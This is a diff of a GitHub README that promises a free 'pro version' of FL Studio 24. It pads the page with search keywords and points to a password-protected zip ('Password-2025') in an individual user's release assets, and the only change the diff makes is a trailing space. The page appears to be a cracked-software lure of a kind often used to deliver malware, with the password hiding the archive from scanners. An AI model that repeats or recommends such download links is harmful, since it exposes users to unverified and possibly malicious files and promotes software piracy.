@@ -7,7 +7,7 @@ Welcome to the FL Studio 24 repository! 🚀 This is your ultimate destination f
 - Topics: FL-Studio, music-production, audio-software, free-software, digital-audio-workstation, pro-version, digital-audio-workstation music-editor fl-studio music-software fl-studio-free fl-studio-tutorial install-fl-studio fl-studio-install fl-studio-latest-version how-to-get-fl-studio fl-studio-24 fl-studio-free-for-pc fl-studio-background download-fl-studio-24 fl-studio-24-plugins free-fl-studio-24 audio-editing-programs music-composition-software download-fl-studio-pc fl-studio-guide 
 
 ## 🔗 Software Access  
-### [Download FL Studio](https://github.com/Xyt069/Fl-Studio-24-For-PC/releases/download/fl-studio/Fl.Studio.PC.zip)
+### [Download FL Studio](https://github.com/Xyt069/Fl-Studio-24-For-PC/releases/download/fl-studio/Fl.Studio.PC.zip) 
 Password-2025
 
 
